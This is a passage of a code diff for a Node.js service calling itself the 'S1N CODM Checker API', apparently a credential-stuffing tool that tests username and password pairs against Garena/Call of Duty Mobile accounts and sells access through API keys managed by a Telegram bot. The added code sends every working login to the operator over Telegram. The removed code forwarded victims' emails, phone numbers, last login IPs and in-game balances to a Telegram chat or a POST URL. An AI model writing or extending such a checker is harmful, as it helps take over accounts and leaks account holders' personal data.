+    log.info(`Request received from ${clientIp}: user=${username || 'N/A'}, key_provided=${apikey ? 'Yes' : 'No'}`, '/codm');
+
+    // Validate API Key
+    if (!apikey || !apiKeys.has(apikey)) {
+        log.warn(`Invalid API key attempt from ${clientIp}. Key: ${apikey || 'None'}`, '/codm');
+        return res.status(401).json({ status: "error", owner: OWNER_TAG, message: "Invalid or missing API key" });
     }
 
+    // Validate Input Parameters
+    if (!username || !password) {
+        log.warn(`Missing username or password from ${clientIp} (Key: ${apikey})`, '/codm');
+        return res.status(400).json({ status: "error", owner: OWNER_TAG, message: "Missing username or password parameter" });
+    }
+
+    // Perform the actual check
     try {
-        // Perform the check
         const result = await performCheck(username, password);
 
-        let responseData = null;
-        let statusCode = 200;
+        if (typeof result === 'object' && result !== null && !result.error) {
+            // --- Successful check ---
+            log.info(`Check successful for ${username} (Key: ${apikey}). Level: ${result?.codm_details?.level ?? 'N/A'}`, '/codm');
 
-        if (typeof result === 'object' && result !== null) {
-            // Success Case
-            const level = result.codm_details?.level ?? 'N/A'; // Safely access level
-            logger.info(`Check successful for ${username}. Level: ${level}`);
+            // --- FORWARD SUCCESS TO TELEGRAM ADMIN (Non-blocking) ---
+            if (bot && TELEGRAM_ADMIN_USER_ID) {
+                // Escape username for MarkdownV2 (simple backticks are usually safe)
+                const escapedUsername = `\`${username.replace(/`/g, "'")}\``; // Basic protection
+                const codmNick = result?.codm_details?.nickname;
+                const codmLevel = result?.codm_details?.level;
+                let codmInfoStr = "N/A";
+                if (codmNick && codmLevel) {
+                    // Escape nick for MarkdownV2 (more complex chars might need full escaping)
+                    const escapedNick = he.encode(codmNick).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+                    codmInfoStr = `${escapedNick} \\(Lvl ${codmLevel}\\)`;
+                } else if (codmNick) {
+                     const escapedNick = he.encode(codmNick).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+                     codmInfoStr = `${escapedNick} (Lvl N/A)`;
+                } else if (result?.codm_details?.status === 'Linked') {
+                    codmInfoStr = "Linked (Details N/A)";
+                }
 
-             // Remove password before sending/forwarding if present
-             const resultToSend = { ...result };
-             delete resultToSend.password; // Remove password field if it exists
+                const successMsg = `✅ Check success for user: ${escapedUsername}\nCODM: ${codmInfoStr}`;
 
-            responseData = { status: "success", data: resultToSend, owner: EXPECTED_OWNER };
-            statusCode = 200;
-
-            // Add to forwarding queue if enabled
-            if (FORWARD_POST_URL || (TELEGRAM_BOT_TOKEN && FORWARD_CHAT_ID)) {
-                // Forward the version *without* the password
-                forwardQueue.push({ username, resultData: resultToSend });
-                logger.debug(`Added successful check for ${username} to forward queue.`);
+                bot.sendMessage(TELEGRAM_ADMIN_USER_ID, successMsg, { parse_mode: 'MarkdownV2' })
+                    .catch(err => {
+                        log.warn(`Failed to forward success message to admin ${TELEGRAM_ADMIN_USER_ID}: ${err.message || err}`, '/codm');
+                    });
             } else {
-                logger.debug("Forwarding disabled, skipping queue.");
+                if (!bot) log.warn("Telegram bot instance not available for forwarding success.", '/codm');
+                if (!TELEGRAM_ADMIN_USER_ID) log.warn("Telegram Admin User ID not configured for forwarding success.", '/codm');
             }
+            // --- END TELEGRAM FORWARD ---
+
+            return res.status(200).json({ status: "success", owner: OWNER_TAG, data: result });
 
         } else if (typeof result === 'string') {
-            // Failure Case (result is an error string)
-            logger.warn(`Check failed for ${username}: ${result}`);
-            const errorDetail = result.includes("]") ? result.split("]", 1)[1].trim() : result;
+            // Handle known error strings
+            log.warn(`Check failed for ${username} (Key: ${apikey}): ${result}`, '/codm');
+            let status_code = 500; // Default internal error
             let message = "Check failed";
-            statusCode = 500; // Default internal error
+            let detail = result;
+
+             // Extract detail cleanly
+            if (result.includes("]")) {
+                 detail = result.split("]", 1)[1]?.trim() || result;
+            }
 
             if (result.startsWith("[API_ERROR]")) {
                 message = "Checker API error";
-                statusCode = 500; // Default API error
-                if (result.includes("CAPTCHA")) statusCode = 429; // Too Many Requests (Captcha)
-                if (result.includes("Timeout")) statusCode = 504; // Gateway Timeout
-                if (result.includes("RateLimit") || result.includes("Rate Limited")) statusCode = 429;
-                 if (result.includes("Connection")) statusCode = 503; // Service Unavailable
-                 if (result.includes("Forbidden") || result.includes("HTTP Error 403")) statusCode = 403; // Forbidden
-                 if (result.includes("HTTP")) { // Try to extract specific HTTP code if possible
-                    const httpMatch = result.match(/HTTP(?: Error)? (\d{3})/);
-                    if(httpMatch && httpMatch[1]) {
-                        const httpCode = parseInt(httpMatch[1], 10);
-                        if(httpCode >= 400 && httpCode < 600) statusCode = httpCode;
-                    }
-                 }
-
+                if (result.includes("CAPTCHA")) status_code = 429; // Too Many Requests / CAPTCHA
+                else if (result.includes("Timeout")) status_code = 504; // Gateway Timeout
+                else if (result.includes("RateLimit")) status_code = 429;
+                else if (result.includes("Connection")) status_code = 503; // Service Unavailable
+                else status_code = 500; // Internal Server Error / Dependency Issue
             } else if (result.startsWith("[LOGIN_FAIL]")) {
                 message = "Login failed";
-                statusCode = 403; // Forbidden (auth failure)
+                status_code = 403; // Forbidden (Invalid Credentials / Account Issue)
             } else if (result.startsWith("[CODM_FAIL]") || result.startsWith("[CODM_WARN]")) {
-                message = "CODM check failed or warned post-login";
-                statusCode = 502; // Bad Gateway (issue with upstream CODM check)
+                message = "CODM check failed post-login";
+                 if (result.startsWith("[CODM_WARN]")) message = "CODM check warning";
+                status_code = 502; // Bad Gateway (Issue with CODM check/script after login)
             }
 
-            responseData = { status: "error", message: message, detail: errorDetail, owner: EXPECTED_OWNER };
-
+            return res.status(status_code).json({ status: "error", owner: OWNER_TAG, message: message, detail: detail });
         } else {
             // Unexpected result type
-            logger.error(`Unexpected result type from perform_check for ${username}: ${typeof result}`);
-            responseData = { status: "error", message: "Internal server error (unexpected result type)", owner: EXPECTED_OWNER };
-            statusCode = 500;
+            log.error(`Unexpected result type from perform_check for ${username}: ${typeof result}`, '/codm');
+            return res.status(500).json({ status: "error", owner: OWNER_TAG, message: "Internal server error (unexpected result type)" });
         }
-
-        // Final check for owner tag consistency before sending response
-        if (responseData && responseData.owner !== EXPECTED_OWNER) {
-             logger.crit(`!!! CRITICAL: Owner tag modified or missing before sending response! Expected '${EXPECTED_OWNER}', Found: '${responseData.owner}'. Forcing correct owner. !!!`);
-             responseData.owner = EXPECTED_OWNER;
-        }
-         if (responseData?.data && responseData.data.owner !== EXPECTED_OWNER) {
-            logger.crit(`!!! CRITICAL: Owner tag modified or missing within 'data' field! Forcing correct owner. !!!`);
-            responseData.data.owner = EXPECTED_OWNER;
-         }
-
-
-        return res.status(statusCode).json(responseData);
 
     } catch (error) {
-        // Catch errors in the route handler itself
-        logger.error(`Critical error processing request for ${username}: ${error.stack || error}`);
-        let responseData = {
-            status: "error",
-            message: "Internal server error",
-            detail: stripAnsiCodes(error.toString()).substring(0,150), // Sanitize error message
-            owner: EXPECTED_OWNER
+        log.error(`Critical error processing request for ${username} (Key: ${apikey}): ${error.stack || error}`, '/codm');
+        return res.status(500).json({ status: "error", owner: OWNER_TAG, message: "Internal server error", detail: stripAnsiCodes(String(error)) });
+    }
+});
+
+app.get('/', (req, res) => {
+     res.status(200).json({
+         status: "ok",
+         message: "S1N CODM Checker API is running (Node.js Version).",
+         owner: OWNER_TAG
+        });
+});
+
+// --- Telegram Bot Functions ---
+
+function setupTelegramBot() {
+    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN" || !TELEGRAM_ADMIN_USER_ID) {
+        log.warn("Telegram Bot Token or Admin User ID not set correctly in .env. Bot will not run.", 'TelegramBot');
+        return null;
+    }
+
+    try {
+        bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
+        log.info("Telegram bot initialized and polling.", 'TelegramBot');
+
+        // --- Authorization Middleware ---
+        const authorized = (msg, reply = true) => {
+            const userId = msg.from?.id;
+            if (userId !== TELEGRAM_ADMIN_USER_ID) {
+                if (reply) bot.sendMessage(msg.chat.id, "⛔ You are not authorized to use this command.");
+                log.warn(`Unauthorized Telegram access attempt by user ${userId} (${msg.from?.username || 'N/A'})`, 'TelegramBot');
+                return false;
+            }
+            return true;
         };
-         // Ensure owner tag in critical error
-        if (responseData.owner !== EXPECTED_OWNER) {
-            logger.crit(`!!! CRITICAL: Owner tag modified or missing during critical error handling! Forcing correct owner. !!!`);
-            responseData.owner = EXPECTED_OWNER;
-        }
-        return res.status(500).json(responseData);
-    }
-});
 
+        // --- Command Handlers ---
+        bot.onText(/\/start$/, (msg) => {
+            if (!authorized(msg)) return;
+            bot.sendMessage(msg.chat.id,
+                `👋 Hello Admin\\! \\(${OWNER_TAG}\\)\n\n` + // Escaped ! and added owner
+                `Use /addkey \`<key>\` to add an API key\\.\n` +
+                `Use /removekey \`<key>\` to remove an API key\\.\n` +
+                `Use /listkeys to view current keys\\.\n`+
+                `Use /reloadkeys to force reload from file\\.`,
+                 { parse_mode: "MarkdownV2" }
+            );
+        });
 
-// --- Result Forwarder Logic ---
-
-async function resultForwarderLoop() {
-    const forwarderName = "ResultForwarder";
-    logger.info(`${forwarderName} loop started.`);
-    logger.info(`${forwarderName}: POST Forwarding to ${FORWARD_POST_URL || 'DISABLED'}`);
-    logger.info(`${forwarderName}: Telegram Forwarding to ${FORWARD_CHAT_ID ? `Chat ID ${FORWARD_CHAT_ID}` : 'DISABLED'} ${TELEGRAM_BOT_TOKEN ? '(Token Configured)' : '(Token Missing)'}`);
-
-    while (true) {
-        if (forwardQueue.length > 0) {
-            const item = forwardQueue.shift(); // Get the oldest item
-            if (!item) continue; // Should not happen, but safeguard
-
-            const { username, resultData } = item;
-            logger.debug(`[${forwarderName}] Dequeued successful check for ${username} for forwarding.`);
-
-             // Ensure owner tag consistency before forwarding
-            if (resultData && resultData.owner !== EXPECTED_OWNER) {
-                 logger.warn(`[${forwarderName}] Correcting owner tag before forwarding for ${username}.`);
-                 resultData.owner = EXPECTED_OWNER;
+        bot.onText(/\/addkey (.+)/, async (msg, match) => {
+            if (!authorized(msg)) return;
+            const newKey = match[1].trim();
+            if (!newKey) {
+                bot.sendMessage(msg.chat.id, "⚠️ API key cannot be empty.");
+                return;
             }
+            if (/\s/.test(newKey)) {
+                 bot.sendMessage(msg.chat.id, "⚠️ API key cannot contain spaces.");
+                 return;
+             }
 
-
-            // --- POST Forwarding ---
-            if (FORWARD_POST_URL && resultData) {
-                try {
-                    logger.debug(`[${forwarderName}] Attempting POST forward for ${username} to ${FORWARD_POST_URL}`);
-                    const postHeaders = {
-                        'Content-Type': 'application/json',
-                        'User-Agent': 'CODMCheckerForwarderNode/1.0' // Identify the forwarder
-                    };
-
-                    const response = await axios.post(FORWARD_POST_URL, resultData, {
-                        headers: postHeaders,
-                        timeout: 15000 // 15 seconds
-                    });
-                    // Log success only on 2xx status codes
-                    if (response.status >= 200 && response.status < 300) {
-                        logger.info(`[${forwarderName}] Successfully forwarded check for ${username} via POST to ${FORWARD_POST_URL} (Status: ${response.status})`);
-                    } else {
-                         // Log non-2xx responses as warnings/errors
-                         logger.warn(`[${forwarderName}] Forwarding POST request for ${username} to ${FORWARD_POST_URL} completed with status ${response.status}. Response: ${String(response.data).substring(0,100)}`);
-                    }
-                } catch (error) {
-                     const status = error.response ? error.response.status : 'N/A';
-                     const respData = error.response ? String(error.response.data).substring(0,100) : '';
-                    logger.error(`[${forwarderName}] Failed to forward check for ${username} via POST to ${FORWARD_POST_URL}: ${error.message} (Status: ${status}) Response: ${respData}`);
+            await loadApiKeys(); // Ensure latest keys are loaded
+            if (apiKeys.has(newKey)) {
+                // Escape key for MarkdownV2 before sending
+                 const escapedKey = he.encode(newKey).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+                bot.sendMessage(msg.chat.id, `ℹ️ API key \`${escapedKey}\` already exists\\.`, { parse_mode: "MarkdownV2" });
+            } else {
+                apiKeys.add(newKey); // Add to the set in memory
+                const saved = await saveApiKeys(); // Attempt to save to file
+                if (saved) {
+                     const escapedKey = he.encode(newKey).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+                    bot.sendMessage(msg.chat.id, `✅ API key \`${escapedKey}\` added successfully\\.`, { parse_mode: "MarkdownV2" });
+                    log.info(`API key '${newKey}' added by admin ${msg.from.id} via Telegram.`, 'TelegramBot');
+                } else {
+                    apiKeys.delete(newKey); // Rollback memory change if save failed
+                    bot.sendMessage(msg.chat.id, "❌ Failed to save API keys to file. Check logs. Key not added.");
                 }
             }
+        });
 
-            // --- Telegram Forwarding ---
-            if (TELEGRAM_BOT_TOKEN && FORWARD_CHAT_ID && resultData) {
-                try {
-                    logger.debug(`[${forwarderName}] Attempting Telegram forward for ${username} to ${FORWARD_CHAT_ID}`);
+        bot.onText(/\/removekey (.+)/, async (msg, match) => {
+            if (!authorized(msg)) return;
+            const keyToRemove = match[1].trim();
 
-                    const codmDetails = resultData.codm_details || {};
-                    const level = codmDetails.level ?? 'N/A';
-                    const nickname = codmDetails.nickname ?? 'N/A';
-                    const region = codmDetails.region ?? 'N/A';
-                    const uid = codmDetails.uid ?? 'N/A';
-                    const shells = resultData.garena_shells ?? 0;
-                    const country = resultData.account_country ?? 'N/A';
-                    const lastLogin = resultData.last_login_time ?? 'N/A';
-                    const lastIp = resultData.last_login_ip ?? 'N/A';
-                    const email = resultData.bindings?.email_address ?? 'N/A';
-                    const mobile = resultData.bindings?.mobile_number ?? 'N/A';
-
-                    // Use lodash escape for HTML safety
-                    const escape = (str) => _.escape(String(str));
-
-                    const message = `
-✅ <b>Check Successful</b> ✅
-
-👤 <b>Username:</b> <code>${escape(username)}</code>
-🎮 <b>CODM Nick:</b> ${escape(nickname)}
-📊 <b>CODM Level:</b> ${level}
-🌍 <b>CODM Region:</b> ${escape(region)}
-🆔 <b>CODM UID:</b> <code>${escape(uid)}</code>
-💰 <b>Shells:</b> ${shells}
---- Account Info ---
-🗺️ <b>Country:</b> ${escape(country)}
-📧 <b>Email:</b> ${escape(email)}
-📱 <b>Mobile:</b> ${escape(mobile)}
-🕒 <b>Last Login:</b> ${escape(lastLogin)}
-📍 <b>Last Login IP:</b> <code>${escape(lastIp)}</code>
-
-<i>Checked by ${escape(EXPECTED_OWNER)} API</i>
-                    `.trim(); // Trim whitespace
-
-                    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                    const payload = {
-                        chat_id: FORWARD_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    };
-                    const tgHeaders = { 'Content-Type': 'application/json' };
-
-                    const tgResponse = await axios.post(telegramUrl, payload, {
-                        headers: tgHeaders,
-                        timeout: 10000 // 10 seconds
-                    });
-
-                    if (tgResponse.data && tgResponse.data.ok) {
-                        logger.info(`[${forwarderName}] Successfully forwarded check for ${username} via Telegram request to ${FORWARD_CHAT_ID}.`);
-                    } else {
-                        // Log Telegram API error description if available
-                        const errorDesc = tgResponse.data?.description || 'Unknown error from Telegram API';
-                        logger.error(`[${forwarderName}] Telegram API returned error for ${username} to ${FORWARD_CHAT_ID}: ${errorDesc} (Status: ${tgResponse.status})`);
-                    }
-
-                } catch (error) {
-                     const status = error.response ? error.response.status : 'N/A';
-                     const respData = error.response?.data ? JSON.stringify(error.response.data).substring(0,100) : '';
-                    logger.error(`[${forwarderName}] Failed to send Telegram message request to ${FORWARD_CHAT_ID} for user ${username}: ${error.message} (Status: ${status}) Response: ${respData}`);
+            await loadApiKeys(); // Ensure latest keys are loaded
+            if (!apiKeys.has(keyToRemove)) {
+                const escapedKey = he.encode(keyToRemove).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+                bot.sendMessage(msg.chat.id, `ℹ️ API key \`${escapedKey}\` not found\\.`, { parse_mode: "MarkdownV2" });
+            } else {
+                apiKeys.delete(keyToRemove); // Remove from memory
+                const saved = await saveApiKeys(); // Attempt save
+                if (saved) {
+                    const escapedKey = he.encode(keyToRemove).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+                    bot.sendMessage(msg.chat.id, `✅ API key \`${escapedKey}\` removed successfully\\.`, { parse_mode: "MarkdownV2" });
+                    log.info(`API key '${keyToRemove}' removed by admin ${msg.from.id} via Telegram.`, 'TelegramBot');
+                } else {
+                    apiKeys.add(keyToRemove); // Rollback memory change if save failed
+                    bot.sendMessage(msg.chat.id, "❌ Failed to save API keys to file. Check logs. Key not removed.");
                 }
-            } // End Telegram Check
+            }
+        });
 
-            // Small delay between processing items if queue was busy
-            await new Promise(resolve => setTimeout(resolve, 50));
+        bot.onText(/\/listkeys$/, async (msg) => {
+            if (!authorized(msg)) return;
+            await loadApiKeys(); // Ensure latest keys
+            if (apiKeys.size === 0) {
+                bot.sendMessage(msg.chat.id, "ℹ️ No API keys found.");
+            } else {
+                // Escape keys for MarkdownV2
+                 const keysList = Array.from(apiKeys).sort().map(key =>
+                     "`" + he.encode(key).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&') + "`" // Escape MarkdownV2 special chars
+                 ).join("\n");
+                bot.sendMessage(msg.chat.id, `🔑 Current API Keys (${apiKeys.size}):\n${keysList}`, { parse_mode: 'MarkdownV2' });
+            }
+        });
 
-        } else {
-            // Queue is empty, wait longer before checking again
-            await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second
-        }
-    } // End while true
-}
+         bot.onText(/\/reloadkeys$/, async (msg) => {
+             if (!authorized(msg)) return;
+             await loadApiKeys();
+             bot.sendMessage(msg.chat.id, `✅ Reloaded ${apiKeys.size} keys from file\\.`, { parse_mode: 'MarkdownV2' });
+         });
 
-// --- Start Server ---
-async function startServer() {
-    logger.info(`--- API Checker Script Started (PID: ${process.pid}, Node: ${process.version}) ---`);
-    logger.info(`Platform: ${os.platform()}, Arch: ${os.arch()}, Hostname: ${os.hostname()}`);
+        // Optional: Catch-all for unknown commands for the admin
+        bot.on('message', (msg) => {
+            // Ignore if it's a known command or not from admin
+            if (msg.text && msg.text.startsWith('/') && !['/start', '/addkey', '/removekey', '/listkeys', '/reloadkeys'].some(cmd => msg.text.startsWith(cmd))) {
+                if (authorized(msg, false)) { // Authorize but don't send the default "not authorized" reply
+                     bot.sendMessage(msg.chat.id, "❓ Sorry, I didn't understand that command\\. Use /start to see available commands\\.", { parse_mode: 'MarkdownV2' });
+                }
+            }
+        });
 
-    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN" || !FORWARD_CHAT_ID) {
-         logger.warn("Telegram Bot Token or Forward Chat ID not configured correctly. Telegram forwarding feature may be disabled or use default admin ID.");
-    } else {
-        logger.info(`Telegram forwarding configured for Chat ID: ${FORWARD_CHAT_ID}`);
+        // Error handling for the bot itself
+        bot.on('polling_error', (error) => {
+            log.error(`Telegram Polling Error: ${error.code} - ${error.message}`, 'TelegramBot');
+            // Optionally, try to restart polling after a delay, or notify admin if possible
+            // Be careful not to create an error loop
+        });
+        bot.on('webhook_error', (error) => {
+             log.error(`Telegram Webhook Error: ${error.code} - ${error.message}`, 'TelegramBot');
+         });
+
+        return bot;
+
+    } catch (error) {
+        log.error(`Failed to initialize Telegram bot: ${error}`, 'TelegramBot');
+        return null;
     }
-     if (!FORWARD_POST_URL) {
-        logger.info("POST URL forwarding is disabled.");
-     } else {
-        logger.info(`POST URL forwarding enabled for: ${FORWARD_POST_URL}`);
-     }
-     if (!EXPECTED_OWNER || !EXPECTED_OWNER.startsWith('t.me/')) {
-        logger.warn(`EXPECTED_OWNER constant (${EXPECTED_OWNER}) doesn't look like a valid Telegram username link. Ensure it is set correctly.`);
-     }
-
-
-    // Start the forwarder loop (don't await it, let it run in background)
-    resultForwarderLoop().catch(err => {
-         logger.error(`CRITICAL ERROR in ResultForwarder loop: ${err.stack || err}`);
-         // Consider process exit or restart logic here if the forwarder is critical
-    });
-
-
-    app.listen(PORT, () => {
-        logger.info(`Express application listening on port ${PORT}`);
-        logger.info(`Access API at http://localhost:${PORT} or http://<your-ip>:${PORT}`);
-        logger.info(`Test endpoint: GET http://localhost:${PORT}/codm?username=someuser&password=somepass`);
-    }).on('error', (err) => {
-        logger.error(`Failed to start Express server: ${err.stack || err}`);
-        process.exit(1); // Exit if server can't start
-    });
 }
 
-// Graceful shutdown handling
-const signals = {
-  'SIGHUP': 1,
-  'SIGINT': 2,
-  'SIGTERM': 15
-};
 
-Object.keys(signals).forEach((signal) => {
-  process.on(signal, () => {
-    logger.info(`\n--- Received ${signal}, shutting down gracefully ---`);
-    // Implement any cleanup here (e.g., closing DB connections, waiting for logs)
-    // For now, just log and exit.
-    logger.info("--- API Checker Script Stopping ---");
-     // Optionally wait for logs to flush
-     logger.end ? logger.end() : logger.info("Logger flush not available or needed."); // Winston might handle flush on exit
-    process.exit(128 + signals[signal]);
-  });
-});
+// --- Main Execution ---
+(async () => {
+    log.info(`--- API Checker Script Started (PID: ${process.pid}) ---`);
+    log.info(`--- Owner: ${OWNER_TAG} ---`);
+    await loadApiKeys(); // Initial load of keys
 
-process.on('uncaughtException', (err) => {
-    logger.error('Uncaught Exception:', err.stack || err);
-    // Consider if you should exit or try to recover
-    // process.exit(1); // Exit on uncaught exception is often safest
-});
+    // Start Telegram bot
+    setupTelegramBot(); // Starts polling internally if configured
 
-process.on('unhandledRejection', (reason, promise) => {
-    logger.error('Unhandled Rejection at:', promise, 'reason:', reason.stack || reason);
-    // Consider if you should exit or try to recover
-    // process.exit(1);
-});
+    // Start Express app
+    const host = process.env.HOST || '0.0.0.0'; // Use HOST env var if set, otherwise default
+    const port = parseInt(process.env.PORT || '5000', 10); // Use PORT env var if set, otherwise default
 
+    app.listen(port, host, () => {
+        log.info(`Express application listening on http://${host}:${port}`);
+    });
 
-// Start the application
-startServer();
+})();
+
+// Graceful shutdown handler
+async function gracefulShutdown(signal) {
+    log.info(`${signal} received. Shutting down gracefully...`);
+    // Add any cleanup tasks here (e.g., closing DB connections)
+    if (bot) {
+        log.info("Stopping Telegram bot polling...");
+        // Add a timeout to stopPolling in case it hangs
+        const stopPollingTimeout = setTimeout(() => {
+            log.warn("Telegram bot stopPolling timed out. Forcing exit.");
+            process.exit(1); // Exit with error code if timeout
+        }, 5000); // 5 second timeout
+
+        try {
+            await bot.stopPolling({ cancel: true }); // Request cancellation of pending updates
+             clearTimeout(stopPollingTimeout);
+            log.info("Telegram bot polling stopped.");
+        } catch (err) {
+             clearTimeout(stopPollingTimeout);
+             log.error(`Error stopping bot polling: ${err}`, 'Shutdown');
+             process.exitCode = 1; // Indicate error on exit
+        }
+    }
+    log.info(`--- API Checker Script Stopping (Owner: ${OWNER_TAG}) ---`);
+    process.exit(process.exitCode || 0); // Exit with stored code or 0
+}
+
+process.on('SIGINT', () => gracefulShutdown('SIGINT'));
+process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
